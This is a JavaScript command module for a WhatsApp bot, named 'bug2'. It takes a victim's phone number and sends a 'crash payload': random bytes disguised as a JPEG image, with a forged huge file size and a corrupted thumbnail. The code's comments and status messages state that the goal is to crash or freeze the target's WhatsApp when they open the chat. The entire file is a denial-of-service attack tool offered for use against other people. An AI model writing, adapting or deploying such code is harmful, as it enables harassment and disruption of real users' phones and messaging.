const settings = require('../../settings');
const logger = require('../../lib/logger');
const crypto = require('crypto');

module.exports = {
    name: 'bug2',
    aliases: ['crash2', 'freeze2', 'lag2'],
    category: 'owner',
    description: 'Send a corrupted media packet that crashes the target WhatsApp',
    usage: '.bug2 <number>',
    ownerOnly: true,
    react: '💣',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}bug2 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `💣 *Deploying Crash Payload to +${targetNum}...*` }, { quoted: mek });

        try {
            // Generate a random 500KB fake image buffer
            // This tricks WhatsApp into thinking it's a real image
            const fakeBuffer = crypto.randomBytes(500 * 1024); 

            // Send it as an image. The phone will try to decode this random data and fail spectacularly.
            await conn.sendMessage(jid, {
                image: fakeBuffer,
                caption: '💣',
                mimetype: 'image/jpeg',
                fileLength: 999999999, // Fake massive file size to break the media loader
                jpegThumbnail: fakeBuffer.slice(0, 5000) // Corrupted thumbnail
            });
            
            await conn.sendMessage(chatId, { text: `✅ *Crash Payload Deployed!*\n\nWhen the target opens the chat, their WhatsApp will crash or freeze for a few seconds.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[BUG2] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deploy bug: ${error.message}` }, { quoted: mek });
        }
    }
};